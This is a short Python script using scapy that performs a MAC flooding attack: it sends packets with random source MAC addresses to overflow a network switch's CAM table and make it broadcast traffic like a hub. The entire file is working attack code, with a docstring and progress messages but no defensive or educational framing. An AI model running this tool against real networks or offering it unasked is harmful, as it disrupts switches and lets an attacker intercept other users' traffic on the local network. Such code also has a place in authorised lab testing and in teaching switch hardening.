#!/usr/bin/env python3
from scapy.all import *
import random

def run_mac_flood(interface, target=None, duration=60, count=1000):
    """
    Floods the switch CAM table with random MAC addresses to force hub-like behavior.
    Args:
        interface (str): Network interface (e.g., eth0)
        target (str): Optional target MAC (default: broadcast)
        duration (int): Duration in seconds
        count (int): Number of packets to send
    """
    print(f"[+] Starting MAC flooding on {interface} with {count} packets")
    dst_mac = target if target else "ff:ff:ff:ff:ff:ff"  # Broadcast if no target
    for _ in range(count):
        src_mac = RandMAC()  # Random source MAC
        pkt = Ether(src=src_mac, dst=dst_mac) / IP(src="0.0.0.0", dst="255.255.255.255") / UDP(sport=12345, dport=12345)
        sendp(pkt, iface=interface, inter=0.01, verbose=0)  # 100 pkt/s
    print("[+] MAC flooding complete. Check for hub-like behavior.")
